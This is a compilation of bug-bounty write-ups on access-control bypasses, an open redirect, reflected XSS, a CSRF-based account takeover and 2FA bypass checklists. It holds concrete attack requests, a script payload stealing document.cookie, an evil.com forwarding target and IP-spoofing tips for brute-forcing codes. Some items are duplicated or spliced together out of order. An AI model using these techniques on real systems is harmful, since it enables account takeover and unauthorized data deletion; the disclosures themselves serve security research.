I hope you learned something from this write-up. I will be sharing more interesting and critical DoS findings in future posts, including some that I have 
never shared before

Number: 27
title: $800 Improper Authorization Flaw: Unauthorized Project Reclaiming Post Transfer
id: writeup

The Flaw: Exploiting Project Transfer Vulnerability

ExamenTry promises that project transfers are permanent and cannot be undone. However, a vulnerability in this process 
allows an attacker to reclaim control of a project even after it has been transferred to another user. By capturing and 
reusing specific API requests, an attacker can bypass the intended permanence of the project transfer, leading to unauthorized
access and control.

Number: 28
title: Regeneration of API key by low level user: 500$ Access Control bug
id: writeup 

Understanding Target

Examkite(Virtual Name of bbp), a versatile continuous integration and delivery (CI/CD) platform, empowers 
development teams to streamline and automate their software delivery processes. This platform serves as the
backbone for efficient collaboration, enabling teams to build, test, and deploy code seamlessly.

The Bug

The vulnerability is a type of API access control concern, allowing regular users to exploit an API endpoint meant 
for higher-access users. This oversight may empower an attacker to perform actions beyond their intended capabilities. 
If exploited, an attacker could carry out unauthorized actions and enables regular Examkite users to regenerate an API
key for the test suite through an API endpoint typically restricted to administrators.

Before we move on, if you like my write-ups, please support me by clapping, sharing, and you can clap up to 50 times
here on Medium, it’s free. Thank you.

Steps to Reproduce:
Use two accounts one of admin and other of low level user.
Go to api key regeneration then click on generate.
Intercept the request and capture it.
Now go to low level user account.
Become a member
Use the above captured request `POST /organizations/cdscs/analytics/suites/vdzdr/regenerate_api_key` with low level user.
Forward the request.
Now go to admin account and check the api key is get regerated.
The Bounty

A bounty of $500 has been awarded for the responsible disclosure of this security vulnerability by Examkite team.

Number: 29
title: 500$: Open Redirect Vulnerability
id: write up

The Vulnerability: Open Redirect

An open redirect vulnerability exists in JuliaHub’s authentication process, specifically in the handling of the redirect_uri parameter. 
This flaw allows attackers to manipulate the state parameter to redirect users to a malicious website of their choice after authentication, 
rather than the intended launch.huliahub.app domain.

Steps to Reproduce:
Open a browser and navigate to the following URL: https://auth.huliahub.com/dex/auth?scope=openid%20email%20profile%20offline_access&
nonce=ad77078ed8ab53ce0afe27842cdd63cf&redirect_uri=https%3A%2F%2Flaunch.huliahub.app%2Fhuliahub%2Fcallback&response_type=code&client_id=huliahub-prod&state=evil.com/
Replace evil.com in `state` parameter with the malicious domain controlled by the attacker.
Proceed with the authentication process as usual.
Instead of redirecting to launch.huliahub.app, the user will be redirected to evil.com, controlled by the attacker.
Become a member
Impact

Users can be tricked into visiting malicious websites that appear legitimate, compromising their sensitive information.
Attackers can exploit the redirection to harvest user credentials by presenting a fake login page on the malicious domain.

Number: 30
title: Unauthorized Deletion of Forms by Low-Level Unlicensed Users: A 500$ Access Control Bug
id: writeup

The Vulnerability: Unauthorized Form Deletion

In ExamSheet, form deletion is supposed to be restricted to licensed users with specific permissions. 
However, I found that unlicensed users could bypass these restrictions and delete forms using crafted
HTTP requests. This vulnerability highlights a significant gap in the access control mechanism, 
potentially allowing unauthorized data deletion and compromising the integrity of the platform.

The Vulnerability: Unauthorized Form Deletion

In ExamSheet, form deletion is supposed to be restricted to licensed users with specific permissions.
However, I found that unlicensed users could bypass these restrictions and delete forms using crafted
HTTP requests. This vulnerability highlights a significant gap in the access control mechanism, 
potentially allowing unauthorized data deletion and compromising the integrity of the platform.

Steps to Reproduce
Log in with a user account that does not have a license for the ExamSheet platform.
Use the following HTTP POST request to delete forms:
Become a member
POST /b/home?formName=ajax&formAction=fa_deleteGridForm&es_v=268.0.0 HTTP/2
Host: app.examsheet.com
Cookie: ---low level user cookie----
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
ExamSheet-Nep: formName,formAction,errorAsJson,parm1,parm2
X-Exam-Xsrf:  ---------your low level user token---------
Content-Length: 109
Origin: https://app.examsheet.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

formName=ajax&formAction=fa_deleteGridForm&errorAsJson=true&parm1=----form-id----&parm2=---sheet-id---&parm3=&parm4=
Add value inparam1 and param2 with the actual form ID and sheet ID.
Submit the request. A response code of 200 with a message of “success” and “0,0,” indicates that the form was successfully deleted.
setAjaxResponseStatus(true,0,'success',0,0,'[]');
Impact:

This vulnerability significantly undermines ExamSheet’s role-based access control and user privilege management. 
It allows unauthorized users to delete forms, actions that should be restricted to licensed users, leading to:

Unauthorized Data Deletion: Unlicensed users can delete forms, leading to potential loss of critical data.
Compromised Data Integrity: The ability to delete forms without proper authorization can result in unauthorized 
changes or deletions, affecting the integrity of the data.

Number: 31
title: My First Bug Bounty: How I Earned $1,000 With One Simple Step
id: writeup

The Breakthrough: Re-reading robots.txt
One day, while revisiting earlier notes, I decided to check robots.txt again. I'd reviewed it before, but this time I slowed down and gave it a closer look. Among the disallowed paths, one stood out.

Disallow: /admin/
It’s not unusual for sensitive routes to appear in robots.txt, but this caught my attention. There wasn’t anything directly exploitable here, but it was a clue. I decided to explore it further.

I intercepted a request to /admin/ in Burp Suite and forwarded it. The server returned:

403 Forbidden
A forbidden response — meaning the resource existed, but access was blocked.

That was promising.

Trying Bypass Techniques
At this point, I explored different 403 bypass techniques. My checklist included:

Modifying headers like X-Original-Method, X-Forwarded-For, Referer
Trying path variations (/admin/., /admin/%2e/)
Using different user agents
Switching HTTP methods
That last one — changing the request method — is what made the difference.

Become a member
I modified the intercepted GET request to /admin/ and changed the method to POST. Then I forwarded it.

To my surprise, the response was:

200 OK
The forbidden page was now accessible.

Expanding the Discovery
I applied the same method to other admin-related routes:

/admin/users
Every endpoint that previously returned 403 Forbidden to GET requests responded successfully when accessed via POST.

At this point, I didn’t try to interact with the functionality or escalate further. I had demonstrated access to authenticated 
or protected areas through a method bypass, and that was enough to report.


Number: 32
title: Bypass Plan Restriction & Get 350$ Bounty
id: writeup

The Flaw

Normally, access to data forwarding settings on ExamenTry requires a subscription to higher-tier plans. However, I identified a 
flaw that allowed free-tier users to bypass this restriction. By manipulating the project’s settings through a crafted API request,
users could gain unauthorized access to features intended for paying subscribers.

Steps To Reproduce
Log in with a free-tier account on ExamenTry.
Accessing the data forwarding setting require paid trail if we go though U.I but
Access the data forwarding settings for a project using the following link or API request bypass the restrictions :
Because sometimes coders restrict the paid feature through U.I they thing if user doesn't have U.I Access or we are not
showing the feature on U.I dashboard how they can access that feature.
So in examtry i crafted the URL and API which allow me to access the data forwarding
Link: https://yoursubdomain.examentry.io/settings/projects/projectname/plugins/splunk/
API Request:
PUT /api/0/projects/dd-0n/nodecf/plugins/splunk/ HTTP/2
Host: us.examentry.io
...
{"instance":"https://evil.com","index":"mains","source":"examentry","token":"fdvfdvdfsvdfvdf"}
By using the above url or api the free-tier user gains unauthorized access to the data forwarding settings.
Impact

This vulnerability poses a significant risk as it allows free-tier users to access features restricted to higher
subscription levels. This can lead to unauthorized data exposure and potential misuse, impacting the confidentiality and integrity of the system.

Number: 33
title: Plan Ristriction Bypass for Slack Integration: 500$ Improper Validation Check Bug
id: writeup

Understanding Target

Xentry.io is a prominent platform used for error tracking and monitoring in software development. However, a flaw in its 
integration setup process enables users to circumvent plan restrictions and utilize Slack integrations without the required subscription level.

The Vulnerability:

This vulnerability arises from improper validation in Xentry.io’s integration setup flow, particularly when transitioning from GitHub to Slack integrations. 
Users on free plan accounts can exploit this flaw by modifying intercepted HTTP requests, allowing them to add Slack integrations instead of the restricted
GitHub integrations.

Steps to Reproduce:
Create a Free Plan Account:

Sign up for a free plan account on Xentry.io.
Go to the integrations section and select GitHub integration(which is free for all the users) .
Use tools like Burp Suite to intercept the HTTP request for adding GitHub integration. (GET /organizations/dd-0n/integrations/github/setup/? HTTP/2)
Become a member
Replace “github” with “slack” in the intercepted request URL.
Forward the modified request and follow the steps on the new page to connect your Slack account with Xentry.
Impact

Users on free plan accounts can access Slack integrations, potentially exposing sensitive information and configuring alerts within Slack channels.
It undermines Xentry.io’s subscription model by allowing users to utilize premium features reserved for higher subscription tiers, impacting operational 
integrity and service delivery.

Number: 34
title: Reflected XSS in Parser Endpoint — $366 Bounty Earned
id: writeup

Understanding the Target
The Parser service is part of the platform’s email-to-automation workflow. Its purpose is to parse incoming email content, validate it,
and trigger automated actions (“Zaps”).

During error handling, the service displays error messages back to the user when something goes wrong in the parsing/validation stage.
That’s where I noticed the parameter error_description being reflected in the UI.

Key observation:

Error messages are often overlooked by developers.
They commonly take backend error strings and push them into the front-end response.
Perfect spot to check for XSS or HTML injection.
Root Cause & Flow
The endpoint /complete/parser/ accepts query parameters like error and error_description
Instead of sanitizing, the app directly reflected the value of error_description into the HTML response.
This created a sink where user-controlled input could become executable JavaScript.
So the flow looked like this:

User Input (error_description param) → Server → HTML Response → Browser Executes

Steps to Reproduce
Navigate to the vulnerable endpoint.
https://example.com/complete/parser/?error=invalid_request&error_description=Transform+algorithm+not+supported.%3Cscript%3Ealert(document.cookie)%3C/script%3E&state=cc%0Ass

Become a member
2. Observe that the injected script <script>alert(document.cookie)</script> executes in the browser.

Impact
Theft of session cookies or tokens.
Malicious script injection to phish users.
DOM manipulation to redirect or mislead users.
Could be chained with CSRF/Clickjacking for larger impact.

Number: 35
title: Two-factor authentication security testing and possible bypasses
id: writeup by max

1. Lack of rate limit.
The rate Limit algorithm is used to test whether a user session (or IP address) can be limited in attempts or speed, and under 
what circumstances this happens. If the user has performed too many requests within a certain period of time, the web application 
can respond with a 429 code (many requests) or apply a rate limit without showing errors. The absence of a rate limit implies that
during normal enumeration there are no restrictions on the number of attempts and/or speed — it is allowed to iterate over codes any 
amount of times (at any speed) within the session / token validity period.

Quite often, I have to deal with a “silent” rate-limit, — if you saw that there are no errors and the HTTP body/code doesn’t change 
in subsequent requests, it’s early to rejoice, and firstly, you need to check the final result of the attack using valid code.

2. Rate limit exists, but it can be bypassed.
Cases that I had met before:

1) Limiting the flow rate with the absence of blocking after reaching a certain flow rate.
Often, security analysts try to pick up code using 2 or more threads to make an attack faster (in Burp Intruder, the default number of 
threads is 2 without delay). But sometimes a security system from brute-force or a regular Load Balancer can only respond to this single 
factor. If you are trying to brute-force with 2 threads, it is worth reducing the number to 1, and then to 1 with a delay of one second.
Earlier, I was lucky to observe such behavior and precisely with the help of such manipulations the successful selection of code occurred, 
which led to Account Takeover. If the 2FA code doesn’t have a specific expiration date, then we have a lot of time to sort through. But if 
the validity period is present, then the success of the attack is reduced, but the potential danger of vulnerability is still presented since 
there is still a chance of getting into the right code.

3) Rate-limit resetting when updating the code.
In code verification request, rate-limit is present, but after activating the functionality of code re-sending, it resets and allows you to continue the brute force of the code.
Examples of reports:
https://hackerone.com/reports/149598, — theory;
https://hackerone.com/reports/205000, — a practical exploit based on a previous report.

4) Bypassing the rate limit by changing the IP address.
Many locks are based on the restriction of accepting requests from IP, which has reached the threshold of a certain number of attempts 
when executing a request. If the IP address is changed, then there is an opportunity to bypass the restriction. In order to check this 
method, simply change your IP using the Proxy server/VPN and see if the blocking depends on the IP.

Ways to change IP:
— Proxies can be used in an attack using the IP Rotator extension for Burp Suite https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension.
In my opinion, this is the best choice, because it gives us ~ unlimited brute force attempts and IP addresses that allow you to perform a brute-force 
attack without 42x errors and interruptions.


IP Rotate add-on interface
- A good option might be a python script with a proxy requests module, but first, you need to obtain a large number of valid proxies somewhere.
Since IP rotate tool sends requests using AWS IP addresses, all requests will be blocked if the web application is behind the Cloudflare firewall.
In this case, you need to additionally find the IP of the original web server or find a method that doesn’t concern AWS IP addresses.

5) On the site, support for X-Forwarded-For turned on.
The built-in header X-Forwarded-For can be used to change IP. If the application has built-in processing for this header, simply send X-Forwarded-For:
desired_IP to replace the IP to bypass the restriction without the use of additional proxies. Every time a request is sent using X-Forwarded-For, the 
web server will think that our IP address matches the value transmitted through the header.
Related materials:
https://hackerone.com/reports/225897
https://medium.com/@arbazhussain/bypassing-rate-limit-protection-by-spoofing-originating-ip-ff06adf34157

3. 2FA bypass by substituting part of the request from the session of another account.
If a parameter with a specific value is sent to verify the code in the request, try sending the value from the request of another account.
For example, when sending an OTP code, the form ID/user ID or cookie is checked, which is associated with sending the code. If we apply the data
from the parameters of the account on which you want to bypass code verification (Account 1) to a session of a completely different account (Account 2),
receive the code and enter it on the second account, then we can bypass the protection on the first account. After reloading the page, 2FA should disappear.

3. 2FA bypass by substituting part of the request from the session of another account.
If a parameter with a specific value is sent to verify the code in the request, try sending the value from the request of another account.
For example, when sending an OTP code, the form ID/user ID or cookie is checked, which is associated with sending the code. If we apply the
data from the parameters of the 
account on which you want to bypass code verification (Account 1) to a session of a completely different account (Account 2), receive 
the code and enter it on the second account, then we can bypass the protection on the first account. After reloading the page, 2FA should disappear.

4. Bypass 2FA using the “memorization” functionality.
Many sites that support 2FA, have a “remember me” functionality. It is useful when the user doesn’t want to enter a 2FA code on subsequent login windows. 
And it is important to identify the way in which 2FA is “remembered”. This can be a cookie, a value in session/local storage, or simply attaching 2FA to an IP address.

1) If 2FA is attached using a cookie, the cookie value must be unguessable.
That is, if a cookie consists of a set of numbers that increased for each account, then it is quite possible to apply a brute-force attack to cookie value and 
bypass 2FA. Developers should supply the cookie (along with the key session cookie and CSRF token) with the HttpOnly attribute so that it cannot be stolen using 
XSS and used to bypass 2FA.

2) If 2FA is attached to an IP address, you can try to replace your IP address.
To identify this method, log in to your account with the 2FA “memorization” function, then switch to another browser or incognito mode of the current 
browser and try to log in again. If 2FA is not requested at all, then 2FA has been attached to the IP address.
To replace the IP address, you can use the X-Forwarded-For header at the stage of entering the login and password, if the web application supports it.
Using this header, you can also bypass the “IP address white-list” function, if one is present in the account settings. It can be used in conjunction with 
2FA as additional account protection or may not even request 2FA if the IP address matches the white-list (with the consent of the user). Thus, even without 
attaching the 2FA to the IP address via “memorization” functionality, in some cases, 2FA can be bypassed with the help of bypassing the concomitant protection methods.
In general, attaching 2FA to an IP address is not a completely safe way of protection, since if you are present on the same network or connected to the same VPN/Internet 
service provider with a static IP address, 2FA can be bypassed.

5. Improper access control bug on the 2FA dialog page.
Sometimes a dialog page for entering 2FA is presented as a URL with parameters. Access to such a page with parameters in the URL with cookies that do not 
match those used to generate the page or without cookies at all is not safe. But if the developers decided to accept the risks, then you need to go through
a few important points:
1) Does the link for 2FA dialog page expire;
2) Whether the link is indexed in search engines.
If the link has a long period of existence and/or the search engines contain working links for 2FA input/links can be indexed (there are no rules in robots.txt / meta tags), 
then there is a possibility of using a 2FA bypass mechanism on the 2FA input page, in which you can completely bypass entering login and password, and gain access to someone 
else’s account.

6. insufficient censorship of personal data on the 2FA page.
When sending code on a page, censorship is used to protect personal data such as email, phone number, nickname, etc. But this data can be fully disclosed in 
the API endpoints and other requests for which we have enough rights at the 2FA stage. If initially this data was not known, for example, we entered only a login 
without knowing the phone number, then this is considered “Information Disclosure” vulnerability. Knowledge of the phone number/email can be used for subsequent 
phishing/brute force attacks.

An example of exploiting a vulnerability using Credentials Stuffing. Let’s say there is a publicly accessible database with logins and passwords for site A. 
Attackers can use the data from this database on site B:
— Firstly they check whether the user exists in the database of site B using the “Accounts Enumeration” bug in registration/password recovery functionality.
Typically, many sites do not consider this vulnerability and take risks. “Vulnerability” lies in the presence of an error that discloses a fact of user registration 
on the site. Ideally, a secure message on the password recovery page is as follows:

Grammarly
- After receiving the database of existing users, attackers apply passwords to these accounts.
— If they encounter 2FA, they are at a dead end. But in case of insufficient censorship of user data, they can supplement their database with users’ 
data if they were not in the original database and credentials for the original website don’t work.

1) 2FA ignoring when recovering a password.
Many services perform automatic login into your account after completing the password recovery procedure. Since access to your account is provided instantly, 
when you log in to your account, 2FA can be skipped and completely ignored.

Impact of a similar report on HackerOne I sent recently:

If an attacker gains access to the victim’s email (he can hack the account using phishing, brute-force attacks, credentials stuffing, etc.), he can bypass 2FA,
although in this case 2FA should protect the account. At the moment, for 2FA there is a check of the Google Authenticator code or the backup code, but not the code 
from the email, so this Bypass makes sense.

3) Ignoring 2FA in an older version of the application.
Developers often add staging versions of a web application to domains/subdomains to test certain functions. Interestingly, if you log in using your 
username and password, 2FA may not be requested. Perhaps the developers are using an older version of the application in which there is no protection 
for 2FA, 2FA itself is disabled or it was intentionally disabled for testing.

You can also check other vulnerabilities at the same time, — registering a new user on a staging server whose email exists in the production 
version database can give you a user’s personal data from production; the absence of a rate limit in important functionality, for example,
password recovery. An example of such a vulnerability is a $ 15,000 facebook bug, which allowed hacking an account via the brute-force password recovery code
at beta.facebook.com https://www.freecodecamp.org/news/responsible-disclosure-how-i-could-have- hacked-all-facebook-accounts-f47c0252ae4d/.

4) Ignoring 2FA in case of cross-platforming.
Implementations of 2FA in a mobile or desktop version may differ from the web version of the application. 2FA may be weaker than in the web version or completely absent.

7. When disabling 2FA, the current code or password is not requested.
If, when disabling 2FA, additional confirmation is not requested, such as current code from the google authenticator application, the code from email/phone, 
then this behavior has certain risks. With a clean request, there is a chance of a CSRF attack. If a bypass vector of CSRF protection is found (if any), then 
2FA can be disabled. You can also use the clickjacking vulnerability — after a couple of clicks from an unsuspecting user, 2FA will be disabled. Validation of
the previous code will add additional 2FA protection, considering potential CSRF / XSS / Clickjacking attacks, as well as CORS misconfigurations.


8. Previously created sessions remain valid after activation of 2FA.
When 2FA is enabled, it is desirable that parallel sessions on the same account end and that appearing 2FA dialog is 
required, the same with a password change. If the account was compromised and the first reaction of the victim will be 
the turn-on of 2fa, then the attacker’s session will be disabled and the next login and password will require 2FA. All 
in all, this is the best practice to be followed. I often notice how cryptocurrency exchanges add 

9. Lack of Rate-limit in the user’s account.
2FA can be added to various functions of the user’s personal account in order to increase security. This can be a change of email address, 
password, confirmation of a code change for financial transactions, etc. The presence of rate-limit in your 
account may differ from the presence of rate-limit-a in the 2FA window upon entering your account. I have often come across similar cases when 
it was possible to freely brute-force 2FA code in my account, while at the entrance a “Strict” rate-limit was configured.

10. Manipulation of API’s versions.
If you see something like /v*/ in the application’s request, where * is a number, then it’s likely that you can switch to an older version of the API. 
In the old version of the API, there may be weak protection or it may be not presented at all. This is a fairly rare occurrence and occurs in the case 
if developers forgot to remove the old version of the API in the production/staging environment.

For example, /endpoint/api/v4/ login performs a login request, checking the username and password. If 2FA is tied to the account, this request should 
be followed by /endpoint/api/v4/2fa_check, no other options. If we replace the API version before 2FA, then, in some cases, we can avoid it.
/endpoint/api/v3/login can lead to /endpoint/api/v3/login_successful?code=RANDOM, ignoring 2fa_check because in this version of the API, because 
2FA was simply not implemented.

11. Improper Access Control in the backup codes request.
Backup codes are being generated immediately after 2FA is enabled and are available on a single request. After each subsequent call to the request, 
the codes can be regenerated or remain unchanged (static codes).
If there are CORS misconfigurations/XSS vulnerabilities and other bugs that allow you to “pull” backup codes from the response’ request of the backup 
code endpoint, then the attacker could steal the codes and bypass 2FA if the username and password are known.

In general and whole, 2fa is one of the most reliable ways to protect your account, unless, of course, developers store the current 2FA codes of all 
users of the web application in the admin panel, — and this has happened in my practice. I would also like to note that developers of some companies 
create applications for generating their own 2FA codes (examples are Salesforce, Valve) and, due to the lack of security, this emphasis on independence 
from using other authentication applications gives attackers an additional entry point for 2FA bypassing. The range of application of this protection is
quite large and gives those wishing to bypass 2FA protection more opportunities, 
space for creativity and increases the number of variations of 2FA bypasses.
Another example, — in the request /endpoint/api/v4/2fa_check there is a rate-limit, while /endpoint/api/v3/2fa_check allows you to brute-force the codes 
without any restrictions.

If the developers initially added protection against unauthorized data changes, then this protection must be supported and all possible bypasses should be
fixed. If bypass is found, then this is considered as a security feature bypass vulnerability that was implemented by the developers, which is a vulnerability.
such protection. An example of the report on HackerOne, — https://hackerone.com/reports/534450.
I’ll give you an example of the website hackerone.com, — when you turn off 2FA in the form, you need to enter two values at the same time, — the current code from
google authenticator app and password. This is the best and recommended protection.

Number: 36
title: Account Takeover via email verification endpoint leads to unauthorized email binding and password reset
id: writeup Mohamed M Mourad

In a private program on HackerOne (let redacted.com). While testing the website, I noticed that it uses cookies with a nonce SameSite attribute, and an application/json content type. From there, if an endpoint also accepts application/x-www-form-urlencoded, there may be a possibility of cookie-based attacks such as CSRF or link-triggered actions.

In the email verification functionality, I noticed that it still worked even after verifying an email once. This means a user can verify multiple emails, and the account becomes tied to the most recently verified email. From there, hit in my mind, if an attacker could force a victim to verify the attacker’s email address, the victim’s account would become associated with the attacker’s email. As a result, the attacker could reset the password and take over the victim’s account.

Press enter or click to view image in full size

Original Request
The default email verification endpoint is /api/VERIFICATION/email-verify, which uses the POST method and works with application/json. 
When the Content-Type is changed to application/x-www-form-urlencoded, the server responds with 403 Forbidden.

Press enter or click to view image in full size

Forbidden Request
While testing another endpoint, noticed that it uses the old API path /api/web/v1/auth/api-v1-user-forgot-password-save.

Press enter or click to view image in full size

Old API Path — Change Password
So, went back to the email verification functionality, I sent a request to /api/web/v1/VERIFICATION/email-verify with application/x-www-form-urlencoded and 
replayed it. The server responded with 200 OK.

200 OK — POST Method
The default HTTP method for this endpoint was POST. After modifying it to GET and replaying the request, it still worked. This turns the attack scenario from a CSRF
attack into a simple link-click attack. (this step is must if the cookie SameSite is lax, but in my case is not)

Press enter or click to view image in full size

200 OK — GET Method
In the end, deleivered the exploit to the victim via the url: https://redacted.com/api/web/v1/VERIFICATION/email-verify?email=attacker.com. once the victim clicked the 
link, a notification was sent to my email then reset the email password and took over the victim account.

Write on Medium
Tips:
- Check functionality endpoint paths well; you may find old API paths that are vulnerable.
- Check whether the endpoint accepts application/x-www-form-urlencoded, as this may enable CSRF or link-triggered attacks.

Number: 37
title: EMAIL change without password and 2FA (Response Manipulation Simple BUG)
id: writeup by Nirmal Shrestha

I don’t chase CVEs. I don’t race to be first. I’m just a beginner in bug bounty who likes asking: “What if this isn’t as solid as it looks?”

Also, full disclosure:

I once tried logging in with a password made of 10 Zero Width Spaces (U+200B).
The system accepted it, reset my password, and emailed me a confirmation that literally said:
“Your new password is:<space>”

Me, staring into the void: “Ah. So we’re doing interpretive dance security now.”

That’s the thing about invisible characters — they’re not just for blank WhatsApp messages (shoutout to blanktext.net ). Sometimes, they reveal 
how little a system actually validates what you give it.

But this story isn’t about Unicode. It’s about something even simpler: a single JSON field that lied — and the server believed it.

The Discovery: “Verify Your Identity”… Or Just Pretend To?
I started where most do: testing password reset flows, 2FA bypasses on login, token reuse. Nothing worked — REDACTED.COM had locked down the front door properly.

So I moved inward.

After logging in (with 2FA enabled), I went to Account Settings → clicked “Update” next to my email. The page responded with:

“First, verify your identity.”
→ Password field
→ 2FA prompt

Perfect. That’s how it should be.

But instead of entering my real password, I typed “wrongpass” and hit Continue.

In Burp Suite, I saw the request to /users/challenge return:

{ “success”: false, “errorCode”: “invalid-credentials” }

Expected. Boring.

Then — because I’ve seen too many apps trust the client — I changed it to:

{ “success”: true, “errorCode”: “” }

I forwarded the response.

And instead of an error like “Password required” or “2FA code invalid”…
I was instantly redirected to the “Enter your new email” page.

No challenge. No code. No second thought.

I typed attacker@gmail.com, clicked Change Email, and got:
✅ “Email updated successfully.”

I hadn’t proven anything. But the app acted like I’d passed every test.

The Vulnerability: When the Frontend Lies and the Backend Nods
This was a critical post-authentication bypass.REDACTED.COM enforced password + 2FA on the frontend, but the backend never validated whether the user had actually completed the verification before allowing the email change.

Write on Medium
The /users/challenge endpoint was treated as a gate—but the gatekeeper was asleep. The UI only checked if the response said "success": true. It didn’t matter how it got there.

Impact?
An attacker with temporary access to a logged-in session (via XSS, session theft, or shared device) could:

Bypass both password and 2FA,
Change the victim’s email,
Trigger a password reset,
And fully hijack the account.
All because the system confused UI state with authentication truth.

Steps to Reproduce
Log in to REDACTED.COM with 2FA enabled.

Go to Account Management → click Update next to email.

On the “Verify your identity” screen, enter an incorrect password and click Continue.

Intercept the /users/challenge response in Burp Suite.

Change "success": false → "success": true.

Forward the response.

Observe: you’re immediately redirected to the email input form — no 2FA, no error and no password.

Enter any email (e.g., attacker@gmail.com) and submit.

Confirmation appears: “Email changed successfully.”

Attacker now controls account recovery.

How to Fix It (3 Simple Rules)
Never trust client-reported auth status.
The backend must independently verify that a valid password and a fresh 2FA token were submitted in the same session before allowing sensitive actions.
Use short-lived verification tokens.
After successful 2FA, issue a one-time token (e.g., verify_token=abc123). The email change request must include this token—or be rejected.
Treat post-login actions as high-risk.
Being logged in ≠ permission to change identity-critical fields. Always re-validate.

Number: 38
title: 2FA Bypass, Bug Bounty Easy Wins !!
id: writeup by ʏᴀꜱʜʜ

Bypass Technique

Response Manipulation : In response if “success”:false
Change it to “success”:true
Status Code Manipulation : If Status Code is 4xx
Try to change it to 200 OK and see if it bypass restrictions
2FA Code Leakage in Response : Check the response of the 2FA Code Triggering Request to see if the code is leaked.
JS File Analysis : Rare but some JS Files may contain info about the 2FA Code, worth giving a shot
2FA Code Reusability : Same code can be reused
Lack of Brute-Force Protection : Possible to brute-force any length 2FA Code
Missing 2FA Code Integrity Validation : Code for any user account can be used to bypass the 2FA
CSRF on 2FA Disabling : No CSRF Protection on disabling 2FA, also there is no auth confirmation
Password Reset Disable 2FA : 2FA gets disabled on password change/email change
Backup Code Abuse : Bypassing 2FA by abusing the Backup code feature
Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA reset restrictions
Clickjacking on 2FA Disabling Page : Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
Bypass 2fa using Null or 0000 : Enter the code 000000 or null to bypass 2FA protection.
forcefull browsing : lets suppose we enable 2fa on x.com and after entering the username:password we get the 2fa then we enter valid 
otp or code then we get into the website & location is x.com/home, so now we now after entering the 2fa code application send us to the 
/home path then now we can do 1. Enter the Username:Passowrd then Application shows us x.com/2fa change the /2fa to /home & Refresh it if 
application is not asking for 2FA code that means we successfully Bypass 2FA ! ! BINGO


Numbe: 39
title: 2FA Bypass via OTP Reuse Across Multiple Authentication Flows
id: rootx_leet

Step 1: Passwordless Login:
I initiated a passwordless login and received an OTP.
I did not use the OTP, cancelled the login attempt, and waited a bit before retrying login.
A new OTP was generated
To test OTP handling, I submitted the previously issued OTP, which was accepted and granted access successfully.

At this point, it looked like a reusable OTP scenario which sometimes accepted as low or informational severity. Since I couldn’t exploit 
it further at that moment, I reported it anyway.

Result: Marked as P5 / Informational. Fair enough:) or so I thought.

Number:40
title: 2 Factor Authentication Bypass
id: writeup 

Test Objectives
Ensure that authentication is applied across all services that require it.
There is lot of different 2FA Bypass Techniques given below. Check it.

Lack of Brute-Force Protection

This involves all sort of issues which comes under security misconfiguration such as lack of rate limit, no brute-force protection, etc.
1. Request 2FA code and capture this request.

2. Repeat this request for 100–200 times and if there is no limitation set, that’s a rate limit issue.

3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any success.

4. You can also try to initiate, requesting OTPs at one side and brute-forcing at
another side. Somewhere the OTP will match in middle and may give you a quick result.

Password Reset/Email Change — 2FA Disable
1. Assuming that you are able to perform email change or password reset for the victim user or make victim user do it by any means possible.

2. 2FA is disabled after the email is changed or password is reset. This could
be an issue for some organizations. However, depends on case by case basis.

Use this valid 2FA code in the victim 2FA Request and see if it bypass the 2FA Protection.

Missing 2FA Code IntegrityValidation

1. Request a 2FA code from Attacker Account.

Direct Request

1. Directly Navigate to the page which comes after 2FA or any other authenticated page of the application.

2. See if this bypasses the 2FA restrictions.

2FA Code Leakage in Response

1. At 2FA Code Triggering Request, such as Send OTP functionality, capture the Request.

2. See the Response of this request and analyze if the 2FA Code is leaked.

Clickjacking on 2FA DisableFeature

1. Try to Iframe the page where the application allows a user to disable 2FA

Subscribe to the Medium newsletter
2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to fall in your trap.

Response Manipulation

1. Check Response of the 2FA Request.

2. If you Observe “Success”:false

3. Change this to “Success”:true and see if it bypass the 2FA

Status Code Manipulation

2. Change the Response Status Code to “200 OK” and see if it bypass the 2FA

1. If the Response Status Code is 4XX like 401, 402, etc.

2FA Code Reusability

1. Request a 2FA code and use it

3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not when a new code is requested

4. Also, try to re-use the previously used code after long time duration say 1 day or more. That will be an potential issue as 1 day is 
enough duration to crack and guess a 6-digit 2FA code.

2. Now, Re-use the 2FA code and if it is used successfully that’s an issue.
CSRF on 2FA Disable Feature

1. Navigate to 2FA Page and Click on Disable and capture this request with Burp Suite & Generate a CSRF PoC

2. Send this PoC to the victim user and check if CSRF happens successfully and removes the 2FA from victim account.

3. Also check if there is any authentication confirmation such as password or 2FA code required before disabling 2FA

Backup Code Abuse

Apply same techniques used on 2FA such as Response/Status Code Manipulation, Brute-force, etc. to bypass Backup Codes and disable/reset 2FA

Enabling 2FA Doesn’t Expire Previous Session

1. Login to the application in two different browsers and enable 2FA from 1st session.

2. Use 2nd session and if it is not expired, it could be an issue if there is an insufficient session expiration issue. In this scenario if an
attacker hijacks an active session before 2FA, it is possible to carry out all functions without a need for 2FA

2FA Refer Check Bypass
1. Directly Navigate to the page which comes after 2FA or any other authenticated page of the application.
2. If there is no success, change the refer header to the 2FA page URL. This may fool application to pretend as if the request came after satisfying 2FA Condition.
While continuing to explore the application, I came across Two-Factor Authentication (2FA).

That’s where things got interesting.

Step 2: Enabling 2FA
Enabled 2FA on my account
Received an OTP for verification (OTP A)
Entered OTP A >> 2FA successfully enabled
So far, everything looked normal.

Step 3: 2FA Login Bypass
Logged out and tried logging back in
Username + password accepted
2FA challenge appeared
A new OTP was sent (OTP B)
Instead of entering OTP B, I reused OTP A
Logged in successfully

At this moment, it was clear this wasn’t just a minor OTP issue anymore.

Step 4: Cross-Browser Test
To rule out session-related behavior, I tested the same flow in a different browser:

Logged in
2FA prompt appeared
Entered OTP A again
Logged in successfully (same result)

Step 5: Passwordless Login + 2FA OTP Reuse
The application also allows passwordless login even when 2FA is enabled.

Initiated passwordless login
Received a new OTP
